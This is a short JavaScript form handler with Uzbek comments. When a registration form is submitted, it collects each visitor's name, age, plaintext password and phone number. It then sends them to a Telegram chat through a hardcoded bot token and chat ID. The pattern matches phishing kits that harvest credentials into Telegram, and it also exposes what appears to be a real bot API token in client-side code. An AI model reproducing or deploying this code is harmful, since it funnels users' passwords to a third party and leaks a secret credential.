const chatId = "-1002401546522";
const telegramBotId = "7685007728:AAFwYS0MZRWYtf87y8jHsxJrnvrOVjpzGFQ";
const url = "https://api.telegram.org/bot" + telegramBotId + "/sendMessage";

// So'rov yuborish
const sendRequest = (e) => {
    e.preventDefault();

    const firstName = document.querySelector(".js-first-name").value.trim();
    const age = document.querySelector(".js-age").value.trim();
    const password = document.querySelector(".password").value.trim();
    const phone = document.querySelector(".phone").value.trim();

    const message = `👤 Ism: ${firstName}\n🎂 Yosh: ${age}\n 🔒 Parol: ${password}\n 📞 Telefon raqam: ${phone}`;

    const formData = {
        chat_id: chatId,
        text: message,
    };

    axios
        .post(url, formData)
        .then(() => {
            alert("So'rov muvaffaqiyatli yuborildi!");
        })
        .catch(() => {
            alert("Nimadir xato ketdi!");
        });

    // Formani tozalash
    document.querySelector(".js-first-name").value = "";
    document.querySelector(".js-age").value = "";
    document.querySelector(".password").value = "";
    document.querySelector(".phone").value = "";
};

document.querySelector(".js-register-form").addEventListener("submit", sendRequest);
